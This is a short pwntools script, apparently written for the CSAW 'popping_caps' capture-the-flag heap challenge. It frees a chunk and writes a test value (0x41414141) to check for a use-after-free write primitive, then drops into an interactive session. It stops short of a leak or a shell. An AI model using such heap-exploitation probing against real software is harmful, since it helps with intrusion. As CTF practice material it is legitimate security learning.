from pwn import *

# Set up the binary and connection
elf = ELF('./ctf_files/popping_caps')
libc = ELF('./ctf_files/libc.so.6')

def connect():
    if args.REMOTE:
        return remote('pwn.chal.csaw.io', 8000)
    else:
        return process('./ctf_files/popping_caps')

def free_chunk(p, index):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(index).encode())
    return p.recvuntil(b'>')

def write_to_offset(p, offset, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'offset: ', str(offset).encode())
    p.sendlineafter(b'data: ', str(data).encode())
    return p.recvuntil(b'>')

# Start the process
p = process('./ctf_files/popping_caps')

# Free the chunk at index 0
print("[*] Freeing chunk at index 0...")
free_chunk(p, 0)

# Try to write to verify we still have write capability
print("[*] Testing write capability...")
write_to_offset(p, 0, 0x41414141)

p.interactive()

